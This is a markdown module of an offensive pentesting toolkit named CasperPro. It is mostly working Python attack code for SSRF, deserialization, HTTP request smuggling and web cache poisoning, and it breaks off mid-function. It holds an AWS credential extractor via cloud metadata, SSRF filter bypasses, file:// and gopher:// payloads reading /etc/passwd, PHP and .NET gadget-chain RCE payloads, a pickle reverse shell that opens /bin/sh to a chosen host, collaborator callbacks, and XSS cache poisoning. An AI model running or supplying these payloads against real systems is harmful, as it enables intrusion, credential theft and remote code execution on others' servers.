# CasperPro Advanced Injection Module

> SSRF, Deserialization, Request Smuggling, Cache Poisoning, and Prototype Pollution

## Overview

This module covers advanced injection techniques used in enterprise penetration testing. These attacks often lead to critical vulnerabilities including RCE, data exfiltration, and full system compromise.

---

## 1. Server-Side Request Forgery (SSRF)

### SSRF Detection Addon

```python
# ssrf_detector.py
import json
import re
import mitmproxy.http
from urllib.parse import urlparse, parse_qs

class SSRFDetector:
    """Detect potential SSRF injection points in traffic"""
    
    def __init__(self):
        self.ssrf_candidates = []
        self.url_params = ["url", "uri", "path", "dest", "redirect", "target", 
                          "rurl", "domain", "feed", "host", "site", "to", "out",
                          "view", "dir", "show", "navigation", "open", "file",
                          "document", "folder", "pg", "php_path", "doc", "img",
                          "image", "picture", "src", "href", "link", "resource"]
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Check URL parameters
        for param, values in params.items():
            if param.lower() in self.url_params:
                self._add_candidate(flow, param, values[0], "URL parameter")
            elif any(x in values[0].lower() for x in ["http://", "https://", "//"]):
                self._add_candidate(flow, param, values[0], "URL-like value")
        
        # Check request body
        if flow.request.content:
            body = flow.request.get_text()
            
            # JSON body
            if "application/json" in flow.request.headers.get("content-type", ""):
                try:
                    data = json.loads(body)
                    self._check_json_ssrf(flow, data, "")
                except:
                    pass
            
            # Form data
            elif "x-www-form-urlencoded" in flow.request.headers.get("content-type", ""):
                form_params = parse_qs(body)
                for param, values in form_params.items():
                    if param.lower() in self.url_params:
                        self._add_candidate(flow, param, values[0], "Form parameter")
        
        self._save()
    
    def _check_json_ssrf(self, flow, data, path):
        """Recursively check JSON for SSRF candidates"""
        if isinstance(data, dict):
            for key, value in data.items():
                new_path = f"{path}.{key}" if path else key
                if key.lower() in self.url_params:
                    self._add_candidate(flow, new_path, str(value), "JSON field")
                elif isinstance(value, str) and any(x in value.lower() for x in ["http://", "https://"]):
                    self._add_candidate(flow, new_path, value, "URL in JSON")
                else:
                    self._check_json_ssrf(flow, value, new_path)
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._check_json_ssrf(flow, item, f"{path}[{i}]")
    
    def _add_candidate(self, flow, param, value, location):
        self.ssrf_candidates.append({
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "parameter": param,
            "original_value": value,
            "location": location,
            "headers": dict(flow.request.headers)
        })
    
    def _save(self):
        with open("/tmp/casperpro/ssrf_candidates.json", "w") as f:
            json.dump(self.ssrf_candidates, f, indent=2)

addons = [SSRFDetector()]
```

### SSRF Exploitation Framework

```python
# ssrf_exploiter.py
import subprocess
import json
import socket
import time
from typing import List, Dict, Optional
from urllib.parse import quote, urlparse

class SSRFExploiter:
    """Comprehensive SSRF exploitation toolkit"""
    
    def __init__(self, token: str = None, collaborator: str = None):
        self.token = token
        self.collaborator = collaborator or "burpcollaborator.net"
        self.findings = []
        
        # Cloud metadata endpoints
        self.cloud_metadata = {
            "aws": [
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.170.2/v2/credentials/",  # ECS
            ],
            "gcp": [
                "http://169.254.169.254/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            ],
            "azure": [
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
            ],
            "digitalocean": [
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1.json",
            ],
            "alibaba": [
                "http://100.100.100.200/latest/meta-data/",
            ]
        }
        
        # Internal service ports to probe
        self.internal_ports = [21, 22, 23, 25, 80, 110, 111, 135, 139, 143, 
                               443, 445, 993, 995, 1433, 1521, 3306, 3389,
                               5432, 5900, 6379, 8080, 8443, 9200, 27017]
        
        # SSRF bypass techniques
        self.bypass_techniques = {
            "decimal_ip": lambda ip: str(int.from_bytes(socket.inet_aton(ip), 'big')),
            "hex_ip": lambda ip: "0x" + "".join(f"{int(o):02x}" for o in ip.split(".")),
            "octal_ip": lambda ip: ".".join(f"0{int(o):o}" for o in ip.split(".")),
            "ipv6_mapped": lambda ip: f"[::ffff:{ip}]",
            "url_encoding": lambda url: quote(url, safe=''),
            "double_encoding": lambda url: quote(quote(url, safe=''), safe=''),
            "case_variation": lambda url: url.replace("http", "hTtP").replace("localhost", "LocalHost"),
            "redirector": lambda url: f"http://httpbin.org/redirect-to?url={quote(url)}",
            "dns_rebinding": lambda ip: f"http://{ip}.nip.io/",
        }
    
    def curl(self, url: str, method: str = "GET", data: str = None, 
             headers: Dict = None, timeout: int = 10) -> Dict:
        """Execute curl with SSRF payload"""
        cmd = ["curl", "-s", "-w", "\n%{http_code}\n%{time_total}", 
               "--max-time", str(timeout), "-X", method]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        if data:
            cmd.extend(["-d", data])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout.strip()
        lines = output.rsplit("\n", 2)
        
        return {
            "body": lines[0] if len(lines) > 2 else "",
            "status": int(lines[-2]) if len(lines) > 1 and lines[-2].isdigit() else 0,
            "time": float(lines[-1]) if lines[-1].replace(".", "").isdigit() else 0
        }
    
    def test_ssrf(self, target_url: str, param: str, method: str = "GET",
                  original_value: str = "") -> List[Dict]:
        """Test a parameter for SSRF vulnerability"""
        findings = []
        
        # Test 1: Cloud metadata
        print(f"[*] Testing cloud metadata endpoints")
        for cloud, endpoints in self.cloud_metadata.items():
            for endpoint in endpoints:
                payload_url = self._inject_payload(target_url, param, endpoint, method)
                
                extra_headers = {}
                if cloud == "gcp":
                    extra_headers["Metadata-Flavor"] = "Google"
                
                response = self.curl(payload_url, method, headers=extra_headers)
                
                if self._is_metadata_response(response, cloud):
                    finding = {
                        "type": "SSRF - Cloud Metadata",
                        "severity": "CRITICAL",
                        "cloud": cloud,
                        "endpoint": endpoint,
                        "url": payload_url,
                        "evidence": response["body"][:500]
                    }
                    findings.append(finding)
                    print(f"[!] CRITICAL: {cloud} metadata accessible!")
        
        # Test 2: Internal port scanning
        print(f"[*] Testing internal port access")
        for port in self.internal_ports[:10]:  # Limit for speed
            for host in ["127.0.0.1", "localhost", "0.0.0.0"]:
                endpoint = f"http://{host}:{port}/"
                payload_url = self._inject_payload(target_url, param, endpoint, method)
                
                response = self.curl(payload_url, method, timeout=3)
                
                if response["status"] != 0 and response["time"] < 3:
                    finding = {
                        "type": "SSRF - Internal Port Access",
                        "severity": "HIGH",
                        "host": host,
                        "port": port,
                        "url": payload_url,
                        "evidence": f"HTTP {response['status']} in {response['time']}s"
                    }
                    findings.append(finding)
                    print(f"[!] Internal port accessible: {host}:{port}")
        
        # Test 3: Bypass techniques
        print(f"[*] Testing SSRF bypass techniques")
        test_endpoint = "http://169.254.169.254/latest/meta-data/"
        
        for technique_name, technique_func in self.bypass_techniques.items():
            try:
                if "ip" in technique_name:
                    bypassed = technique_func("169.254.169.254")
                    payload = f"http://{bypassed}/latest/meta-data/"
                else:
                    payload = technique_func(test_endpoint)
                
                payload_url = self._inject_payload(target_url, param, payload, method)
                response = self.curl(payload_url, method)
                
                if self._is_metadata_response(response, "aws"):
                    finding = {
                        "type": "SSRF - Bypass Success",
                        "severity": "CRITICAL",
                        "technique": technique_name,
                        "payload": payload,
                        "url": payload_url,
                        "evidence": response["body"][:500]
                    }
                    findings.append(finding)
                    print(f"[!] Bypass successful with {technique_name}!")
            except Exception as e:
                pass
        
        # Test 4: Protocol smuggling
        print(f"[*] Testing protocol smuggling")
        protocol_payloads = [
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "dict://127.0.0.1:6379/INFO",
            "gopher://127.0.0.1:6379/_INFO%0d%0a",
            "ldap://127.0.0.1:389",
            "sftp://127.0.0.1:22",
        ]
        
        for payload in protocol_payloads:
            payload_url = self._inject_payload(target_url, param, payload, method)
            response = self.curl(payload_url, method)
            
            if self._is_sensitive_file(response["body"]):
                finding = {
                    "type": "SSRF - Protocol Smuggling",
                    "severity": "CRITICAL",
                    "protocol": payload.split(":")[0],
                    "payload": payload,
                    "url": payload_url,
                    "evidence": response["body"][:500]
                }
                findings.append(finding)
                print(f"[!] Protocol smuggling successful: {payload}")
        
        self.findings.extend(findings)
        self._save()
        
        return findings
    
    def _inject_payload(self, url: str, param: str, payload: str, method: str) -> str:
        """Inject SSRF payload into URL or body"""
        if method == "GET":
            if "?" in url:
                return f"{url}&{param}={quote(payload)}"
            else:
                return f"{url}?{param}={quote(payload)}"
        else:
            return url  # For POST, payload goes in body
    
    def _is_metadata_response(self, response: Dict, cloud: str) -> bool:
        """Check if response contains cloud metadata"""
        body = response["body"].lower()
        
        indicators = {
            "aws": ["ami-id", "instance-id", "security-credentials", "iam"],
            "gcp": ["project-id", "service-accounts", "access_token"],
            "azure": ["subscriptionid", "resourcegroupname", "vmid"],
            "digitalocean": ["droplet_id", "hostname", "region"],
            "alibaba": ["instance-id", "region-id"]
        }
        
        return any(ind in body for ind in indicators.get(cloud, []))
    
    def _is_sensitive_file(self, content: str) -> bool:
        """Check if response contains sensitive file content"""
        indicators = ["root:", "/bin/bash", "[fonts]", "[extensions]", 
                     "# passwd", "localhost", "127.0.0.1"]
        return any(ind in content for ind in indicators)
    
    def _save(self):
        with open("/tmp/casperpro/ssrf_findings.json", "w") as f:
            json.dump(self.findings, f, indent=2)


# AWS Credential Extractor
def extract_aws_credentials(ssrf_url: str, param: str, token: str = None):
    """Extract AWS credentials via SSRF"""
    exploiter = SSRFExploiter(token)
    
    # Step 1: Get IAM role name
    role_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    payload_url = exploiter._inject_payload(ssrf_url, param, role_url, "GET")
    response = exploiter.curl(payload_url)
    
    if response["status"] == 200:
        role_name = response["body"].strip()
        print(f"[+] IAM Role: {role_name}")
        
        # Step 2: Get credentials
        creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        payload_url = exploiter._inject_payload(ssrf_url, param, creds_url, "GET")
        response = exploiter.curl(payload_url)
        
        if response["status"] == 200:
            creds = json.loads(response["body"])
            print(f"[!] CRITICAL: AWS Credentials Extracted!")
            print(f"    AccessKeyId: {creds.get('AccessKeyId')}")
            print(f"    SecretAccessKey: {creds.get('SecretAccessKey')[:20]}...")
            print(f"    Token: {creds.get('Token')[:50]}...")
            return creds
    
    return None
```

---

## 2. Deserialization Attacks

### Deserialization Detection

```python
# deserialization_detector.py
import json
import base64
import re
import mitmproxy.http

class DeserializationDetector:
    """Detect potential deserialization vulnerabilities"""
    
    def __init__(self):
        self.candidates = []
        
        # Serialization signatures
        self.signatures = {
            "java": [
                b"\xac\xed\x00\x05",  # Java serialized object
                b"rO0AB",  # Base64 Java serialized
                "java.lang.",
                "org.apache.",
                "javax."
            ],
            "php": [
                "O:",  # PHP serialized object
                "a:",  # PHP serialized array
                "s:",  # PHP serialized string
                "i:",  # PHP serialized integer
            ],
            "python": [
                b"\x80\x03",  # Python pickle
                b"\x80\x04",  # Python pickle protocol 4
                "gASV",  # Base64 pickle
                "__reduce__",
                "posix",
            ],
            "dotnet": [
                "AAEAAAD",  # .NET BinaryFormatter
                "TypeObject",
                "System.",
                "$type",  # JSON.NET TypeNameHandling
            ],
            "ruby": [
                "\x04\x08",  # Ruby Marshal
                "BAh",  # Base64 Ruby Marshal
            ]
        }
        
        # Dangerous parameters
        self.dangerous_params = ["data", "object", "state", "viewstate", 
                                 "session", "token", "payload", "message",
                                 "__VIEWSTATE", "cmd", "command"]
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        # Check cookies
        for cookie in flow.request.cookies.fields:
            name, value = cookie
            self._check_serialization(flow, name, value, "Cookie")
        
        # Check headers
        for name, value in flow.request.headers.items():
            if name.lower() in ["x-session", "x-state", "x-token", "authorization"]:
                self._check_serialization(flow, name, value, "Header")
        
        # Check body
        if flow.request.content:
            body = flow.request.get_text()
            content_type = flow.request.headers.get("content-type", "")
            
            if "json" in content_type:
                try:
                    data = json.loads(body)
                    self._check_json_serialization(flow, data, "Body")
                except:
                    pass
            else:
                # Check raw body
                self._check_serialization(flow, "body", body, "Body")
        
        self._save()
    
    def _check_serialization(self, flow, name: str, value: str, location: str):
        """Check if value contains serialized data"""
        # Try base64 decode
        try:
            decoded = base64.b64decode(value)
            value_bytes = decoded
        except:
            value_bytes = value.encode() if isinstance(value, str) else value
        
        for language, sigs in self.signatures.items():
            for sig in sigs:
                if isinstance(sig, bytes):
                    if sig in value_bytes:
                        self._add_candidate(flow, name, value, location, language)
                        return
                else:
                    if sig in value:
                        self._add_candidate(flow, name, value, location, language)
                        return
    
    def _check_json_serialization(self, flow, data, location: str, path: str = ""):
        """Check JSON for serialized data or type hints"""
        if isinstance(data, dict):
            # Check for type hints (JSON.NET, etc.)
            if "$type" in data or "__type" in data or "class" in data:
                self._add_candidate(flow, path or "root", json.dumps(data), 
                                   location, "dotnet_json")
            
            for key, value in data.items():
                new_path = f"{path}.{key}" if path else key
                
                if isinstance(value, str):
                    self._check_serialization(flow, new_path, value, location)
                else:
                    self._check_json_serialization(flow, value, location, new_path)
        
        elif isinstance(data, list):
            for i, item in enumerate(data):
                self._check_json_serialization(flow, item, location, f"{path}[{i}]")
    
    def _add_candidate(self, flow, name: str, value: str, location: str, language: str):
        self.candidates.append({
            "url": flow.request.pretty_url,
            "method": flow.request.method,
            "parameter": name,
            "value": value[:500] if len(value) > 500 else value,
            "location": location,
            "language": language,
            "severity": "HIGH"
        })
        print(f"[!] Potential {language} deserialization: {name} in {location}")
    
    def _save(self):
        with open("/tmp/casperpro/deserialization_candidates.json", "w") as f:
            json.dump(self.candidates, f, indent=2)

addons = [DeserializationDetector()]
```

### Deserialization Payload Generator

```python
# deserialization_payloads.py
import base64
import subprocess
import json
from typing import Dict, List

class DeserializationPayloads:
    """Generate deserialization payloads for various languages"""
    
    @staticmethod
    def java_ysoserial(gadget: str, command: str) -> bytes:
        """Generate Java deserialization payload using ysoserial"""
        # Requires ysoserial.jar
        result = subprocess.run([
            "java", "-jar", "ysoserial.jar", gadget, command
        ], capture_output=True)
        return result.stdout
    
    @staticmethod
    def java_dns_payload(collaborator: str) -> str:
        """Java payload for DNS exfiltration (URLDNS gadget)"""
        # Base64 encoded URLDNS payload template
        # This is a simplified example - real implementation uses ysoserial
        payload = f"""
        rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa
        """
        return payload.strip()
    
    @staticmethod
    def php_serialize_rce(command: str) -> str:
        """PHP object injection payload"""
        # Example using common gadget chains
        payloads = {
            "laravel": f'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{{s:9:"\\x00*\\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{{s:12:"\\x00*\\x00listeners";a:1:{{s:6:"system";a:1:{{i:0;s:6:"system";}}}}}}s:8:"\\x00*\\x00event";s:{len(command)}:"{command}";}}',
            "symfony": f'O:47:"Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter":2:{{s:57:"\\x00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\\x00deferred";a:1:{{i:0;O:33:"Symfony\\Component\\Cache\\CacheItem":2:{{s:11:"\\x00*\\x00poolHash";i:1;s:12:"\\x00*\\x00innerItem";s:{len(command)}:"{command}";}}}}s:53:"\\x00Symfony\\Component\\Cache\\Adapter\\TagAwareAdapter\\x00pool";O:44:"Symfony\\Component\\Cache\\Adapter\\ProxyAdapter":2:{{s:54:"\\x00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\x00poolHash";i:1;s:58:"\\x00Symfony\\Component\\Cache\\Adapter\\ProxyAdapter\\x00setInnerItem";s:6:"system";}}}}',
            "generic": f'O:8:"Exploiter":1:{{s:4:"data";s:{len(command)}:"{command}";}}'
        }
        return payloads
    
    @staticmethod
    def python_pickle_rce(command: str) -> bytes:
        """Python pickle RCE payload"""
        import pickle
        import os
        
        class RCE:
            def __reduce__(self):
                return (os.system, (command,))
        
        return pickle.dumps(RCE())
    
    @staticmethod
    def python_pickle_reverse_shell(host: str, port: int) -> bytes:
        """Python pickle reverse shell"""
        import pickle
        import os
        
        class ReverseShell:
            def __reduce__(self):
                cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
                return (os.system, (cmd,))
        
        return pickle.dumps(ReverseShell())
    
    @staticmethod
    def dotnet_objectdataprovider(command: str) -> str:
        """Generate .NET ObjectDataProvider payload (for JSON.NET)"""
        payload = {
            "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
            "MethodName": "Start",
            "MethodParameters": {
                "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
                "$values": ["cmd", f"/c {command}"]
            },
            "ObjectInstance": {
                "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
            }
        }
        return json.dumps(payload)
    
    @staticmethod
    def ruby_marshal_rce(command: str) -> bytes:
        """Ruby Marshal RCE payload"""
        # Simplified - real implementation uses marshalsec or custom gadgets
        payload = b"\x04\x08o:\x15ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy"
        return payload


class DeserializationExploiter:
    """Exploit deserialization vulnerabilities"""
    
    def __init__(self, token: str = None, collaborator: str = None):
        self.token = token
        self.collaborator = collaborator or "interact.sh"
        self.payloads = DeserializationPayloads()
        self.findings = []
    
    def test_java(self, url: str, param: str, method: str = "POST") -> List[Dict]:
        """Test Java deserialization"""
        findings = []
        
        # Test DNS callback first (safe)
        dns_payload = self.payloads.java_dns_payload(self.collaborator)
        
        print(f"[*] Testing Java deserialization with DNS callback")
        # Would send payload and check collaborator
        
        return findings
    
    def test_php(self, url: str, param: str, method: str = "POST") -> List[Dict]:
        """Test PHP deserialization"""
        findings = []
        
        payloads = self.payloads.php_serialize_rce(f"curl {self.collaborator}")
        
        for framework, payload in payloads.items():
            print(f"[*] Testing PHP deserialization ({framework})")
            # Would send payload
        
        return findings
    
    def test_python(self, url: str, param: str, method: str = "POST") -> List[Dict]:
        """Test Python pickle deserialization"""
        findings = []
        
        # DNS callback test
        payload = self.payloads.python_pickle_rce(f"nslookup test.{self.collaborator}")
        b64_payload = base64.b64encode(payload).decode()
        
        print(f"[*] Testing Python pickle deserialization")
        print(f"    Payload: {b64_payload[:50]}...")
        
        return findings
```

---

## 3. HTTP Request Smuggling

### Request Smuggling Detector and Exploiter

```python
# request_smuggling.py
import subprocess
import socket
import ssl
import time
from typing import Dict, List, Optional

class RequestSmuggling:
    """HTTP Request Smuggling detection and exploitation"""
    
    def __init__(self, target: str):
        self.target = target
        self.findings = []
        
        # Parse target
        if target.startswith("https://"):
            self.use_ssl = True
            self.host = target.replace("https://", "").split("/")[0]
            self.port = 443
        else:
            self.use_ssl = False
            self.host = target.replace("http://", "").split("/")[0]
            self.port = 80
        
        if ":" in self.host:
            self.host, self.port = self.host.split(":")
            self.port = int(self.port)
    
    def _send_raw(self, request: bytes, timeout: float = 10) -> bytes:
        """Send raw HTTP request"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        
        try:
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.sendall(request)
            response = b""
            
            while True:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    break
            
            return response
        finally:
            sock.close()
    
    def detect_cl_te(self) -> Dict:
        """Detect CL.TE request smuggling vulnerability"""
        print("[*] Testing CL.TE smuggling...")
        
        # Smuggled request that should cause timeout or different response
        smuggle_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"  # Smuggled byte
        ).encode()
        
        start = time.time()
        response = self._send_raw(smuggle_request, timeout=5)
        elapsed = time.time() - start
        
        # If server waits for more data (timeout), might be vulnerable
        if elapsed > 4:
            finding = {
                "type": "CL.TE Request Smuggling",
                "severity": "CRITICAL",
                "evidence": f"Server timeout ({elapsed:.2f}s) indicates potential vulnerability",
                "payload": smuggle_request.decode(errors='ignore')
            }
            self.findings.append(finding)
            print(f"[!] Potential CL.TE vulnerability detected!")
            return finding
        
        return None
    
    def detect_te_cl(self) -> Dict:
        """Detect TE.CL request smuggling vulnerability"""
        print("[*] Testing TE.CL smuggling...")
        
        smuggle_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"5c\r\n"
            f"GPOST / HTTP/1.1\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 15\r\n"
            f"\r\n"
            f"x=1\r\n"
            f"0\r\n"
            f"\r\n"
        ).encode()
        
        start = time.time()
        response = self._send_raw(smuggle_request, timeout=5)
        elapsed = time.time() - start
        
        if elapsed > 4:
            finding = {
                "type": "TE.CL Request Smuggling",
                "severity": "CRITICAL",
                "evidence": f"Server timeout ({elapsed:.2f}s) indicates potential vulnerability",
                "payload": smuggle_request.decode(errors='ignore')
            }
            self.findings.append(finding)
            print(f"[!] Potential TE.CL vulnerability detected!")
            return finding
        
        return None
    
    def detect_te_te(self) -> Dict:
        """Detect TE.TE (obfuscated Transfer-Encoding) vulnerability"""
        print("[*] Testing TE.TE smuggling with obfuscation...")
        
        obfuscations = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
            "X: X\r\nTransfer-Encoding: chunked",
            "Transfer-Encoding: chunked\r\nTransfer-encoding: x",
        ]
        
        for obf in obfuscations:
            smuggle_request = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {self.host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{obf}\r\n"
                f"\r\n"
                f"5c\r\n"
                f"GPOST / HTTP/1.1\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 15\r\n"
                f"\r\n"
                f"x=1\r\n"
                f"0\r\n"
                f"\r\n"
            ).encode()
            
            response = self._send_raw(smuggle_request, timeout=5)
            
            if b"GPOST" in response or b"405" in response:
                finding = {
                    "type": "TE.TE Request Smuggling",
                    "severity": "CRITICAL",
                    "obfuscation": obf,
                    "evidence": "Server processed smuggled request",
                    "payload": smuggle_request.decode(errors='ignore')
                }
                self.findings.append(finding)
                print(f"[!] TE.TE vulnerability with obfuscation: {obf}")
                return finding
        
        return None
    
    def exploit_cache_poisoning(self, path: str, poison_content: str) -> Dict:
        """Exploit request smuggling for cache poisoning"""
        print(f"[*] Attempting cache poisoning on {path}")
        
        # Smuggle a request that will poison the cache
        smuggled = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"X-Injected: {poison_content}\r\n"
            f"\r\n"
        )
        
        attack_request = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {self.host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(smuggled)}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"{smuggled}"
        ).encode()
        
        # Send multiple times to increase cache hit probability
        for _ in range(5):
            self._send_raw(attack_request, timeout=2)
        
        # Verify cache poisoning
        verify_response = self._send_raw(
            f"GET {path} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()
        )
        
        if poison_content.encode() in verify_response:
            return {
                "type": "Cache Poisoning via Request Smuggling",
                "severity": "CRITICAL",
                "path": path,
                "poison_content": poison_content
            }
        
        return None
    
    def run_all_tests(self) -> List[Dict]:
        """Run all smuggling tests"""
        print(f"[*] Testing {self.target} for request smuggling")
        
        self.detect_cl_te()
        self.detect_te_cl()
        self.detect_te_te()
        
        return self.findings
```

---

## 4. Cache Poisoning

### Web Cache Poisoning Framework

```python
# cache_poisoning.py
import subprocess
import hashlib
import time
import json
from typing import Dict, List

class CachePoisoning:
    """Web cache poisoning detection and exploitation"""
    
    def __init__(self, target: str, token: str = None):
        self.target = target.rstrip("/")
        self.token = token
        self.findings = []
        
        # Unkeyed headers that might influence response
        self.unkeyed_headers = [
            "X-Forwarded-Host",
            "X-Forwarded-Scheme",
            "X-Forwarded-Proto",
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Host",
            "X-Forwarded-Server",
            "X-HTTP-Method-Override",
            "X-Original-Host",
            "Forwarded",
            "X-Real-IP",
            "X-Forwarded-For",
            "X-Custom-Header",
        ]
        
        # Cache buster to get fresh responses
        self.cache_buster = 0
    
    def _get_cache_buster(self) -> str:
        """Generate unique cache buster parameter"""
        self.cache_buster += 1
        return f"cb{self.cache_buster}{int(time.time())}"
    
    def curl(self, url: str, headers: Dict = None) -> Dict:
        """Make HTTP request"""
        cmd = ["curl", "-s", "-i", "--max-time", "10"]
        
        if self.token:
            cmd.extend(["-H", f"Authorization: Bearer {self.token}"])
        
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        
        cmd.append(url)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        output = result.stdout
        
        # Parse headers and body
        parts = output.split("\r\n\r\n", 1)
        header_text = parts[0]
        body = parts[1] if len(parts) > 1 else ""
        
        # Parse status and headers
        lines = header_text.split("\r\n")
        status = int(lines[0].split()[1]) if lines else 0
        
        resp_headers = {}
        for line in lines[1:]:
            if ": " in line:
                k, v = line.split(": ", 1)
                resp_headers[k.lower()] = v
        
        return {
            "status": status,
            "headers": resp_headers,
            "body": body,
            "cached": "hit" in resp_headers.get("x-cache", "").lower() or 
                     "hit" in resp_headers.get("cf-cache-status", "").lower()
        }
    
    def detect_unkeyed_headers(self, path: str = "/") -> List[Dict]:
        """Detect unkeyed headers that influence cached responses"""
        findings = []
        url = f"{self.target}{path}"
        
        print(f"[*] Testing unkeyed headers on {url}")
        
        # Get baseline response
        cb = self._get_cache_buster()
        baseline = self.curl(f"{url}?{cb}")
        
        for header in self.unkeyed_headers:
            # Unique value to detect reflection
            poison_value = f"evil-{hashlib.md5(header.encode()).hexdigest()[:8]}.com"
            
            # Send poisoned request
            cb = self._get_cache_buster()
            poisoned = self.curl(f"{url}?{cb}", {header: poison_value})
            
            # Check if value is reflected
            if poison_value in poisoned["body"]:
                # Verify caching
                time.sleep(0.5)
                verify = self.curl(f"{url}?{cb}")
                
                if poison_value in verify["body"]:
                    finding = {
                        "type": "Unkeyed Header Cache Poisoning",
                        "severity": "HIGH",
                        "header": header,
                        "path": path,
                        "evidence": f"Header value reflected and cached"
                    }
                    findings.append(finding)
                    print(f"[!] Unkeyed header found: {header}")
        
        self.findings.extend(findings)
        return findings
    
    def detect_unkeyed_params(self, path: str = "/") -> List[Dict]:
        """Detect unkeyed query parameters"""
        findings = []
        url = f"{self.target}{path}"
        
        unkeyed_params = ["utm_source", "utm_medium", "utm_campaign", "fbclid",
                         "gclid", "ref", "callback", "jsonp", "_"]
        
        print(f"[*] Testing unkeyed parameters on {url}")
        
        for param in unkeyed_params:
            poison_value = f"<script>alert('{param}')</script>"
            
            cb = self._get_cache_buster()
            test_url = f"{url}?{cb}&{param}={poison_value}"
            
            response = self.curl(test_url)
            
            if poison_value in response["body"]:
                finding = {
                    "type": "Unkeyed Parameter Cache Poisoning",
                    "severity": "HIGH" if "<script>" in response["body"] else "MEDIUM",
                    "parameter": param,
                    "path": path,
                    "evidence": "Parameter value reflected in response"
                }
                findings.append(finding)
                print(f"[!] Unkeyed parameter found: {param}")
        
        self.findings.extend(findings)
        return findings
    
    def exploit_xss_via_cache(self, path: str, header: str, xss_payload: str) -> Dict:
        """Exploit cache poisoning for XSS"""
        url = f"{self.target}{path}"
        
        print(f"[*] Attempting XSS via cache poisoning on {path}")
        
        # Poison the cache
        for _ in range(5):
            self.curl(url, {header: xss_payload})
            time.sleep(0.2)
        
        # Verify poisoning
        verify = self.curl(url)
        
        if xss_payload in verify["body"]:
            return {
                "type": "Stored XSS via Cache Poisoning",
                "severity": "CRITICAL",
                "path": path,
                "header": header,
                "payload": xss_payload
            }
        
        return None
    
    def detect_cache_deception(self, authenticated_path: str = "/account") -> Dict:
        """Detect web cache deception vulnerability"""
        print(f"[*] Testing cache deception on {authenticated_path}")
        
        # Append static extension to force caching
        extensions = [".css", ".js", ".png", ".jpg", ".ico", ".svg", ".woff"]
        
        for ext in extensions:
            deception_path = f"{authenticated_path}/nonexistent{ext}"
